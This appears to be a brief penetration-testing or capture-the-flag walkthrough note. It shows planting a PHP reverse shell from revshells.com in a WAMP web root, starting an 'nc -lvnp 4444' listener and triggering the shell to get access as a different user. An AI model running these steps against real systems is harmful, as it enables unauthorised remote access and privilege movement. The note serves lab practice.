
so I found `wamp64` on the desktop

cd to `C:\wamp64\www`

go to : https://www.revshells.com/
select `PHP Ivan Sincek` exploit and fill it as following 
![600](Assets/Pasted%20image%2020250825213959.png)

upload the exploit 
```powershell
upload shell.php
```
![600](Assets/Pasted%20image%2020250825214150.png)
start a listener 
```powershell
rlwrap -cAr nc -lvnp 4444
```

run it via the main page 
![600](Assets/Pasted%20image%2020250825214032.png)
you should receive a shell now as different user 
![600](Assets/Pasted%20image%2020250825214245.png)
